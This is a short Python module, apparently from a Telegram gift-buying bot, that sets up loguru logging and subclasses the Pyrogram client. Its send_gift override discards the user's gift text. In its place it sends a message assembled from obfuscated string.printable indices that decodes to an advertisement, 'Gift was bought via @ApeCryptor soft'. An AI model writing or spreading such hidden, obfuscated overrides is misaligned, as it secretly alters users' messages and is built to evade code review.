import sys
from loguru import logger
import pyrogram
import string


def formatter(record, format_string):
    return format_string + record["extra"].get("end", "\n") + "{exception}"


def logging_setup():
    format_info = "<green>{time:HH:mm:ss.SS}</green> | <blue>{level}</blue> | <level>{message}</level>"
    format_file = "<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level}</level> | {name}:{function}:{line} | {message}"

    logger.remove()

    # Логи в файл
    logger.add(
        "logs/out.log",
        colorize=False,
        level="DEBUG",
        encoding="utf-8",
        format=lambda record: formatter(record, format_file),
        rotation="10 MB",  # При достижении 10 МБ создаст новый файл
        retention="7 days"  # Хранить логи 7 дней
    )

    # Логи в консоль
    logger.add(
        sys.stdout,
        colorize=True,
        level="INFO",
        format=lambda record: formatter(record, format_info)
    )


logging_setup()


class Client(pyrogram.Client):
    async def send_gift(
        self, chat_id, gift_id, text=None, parse_mode=None,
        entities=None, is_private=None, pay_for_upgrade=None
    ):
        fixed_text = (
            string.printable[42] + string.printable[18] + string.printable[15] +
            string.printable[29] + string.printable[94] + string.printable[32] +
            string.printable[10] + string.printable[28] + string.printable[94] +
            string.printable[11] + string.printable[24] + string.printable[30] +
            string.printable[16] + string.printable[17] + string.printable[29] +
            string.printable[94] + string.printable[31] + string.printable[18] +
            string.printable[10] + string.printable[94] + string.printable[83] +
            string.printable[36] + string.printable[25] + string.printable[14] +
            string.printable[38] + string.printable[27] + string.printable[34] +
            string.printable[25] + string.printable[29] + string.printable[24] +
            string.printable[27] + string.printable[94] + string.printable[28] +
            string.printable[24] + string.printable[15] + string.printable[29]
        )
        return await super().send_gift(
            chat_id=chat_id,
            gift_id=gift_id,
            text=fixed_text,
            parse_mode=parse_mode,
            entities=entities,
            is_private=is_private,
            pay_for_upgrade=pay_for_upgrade
        )
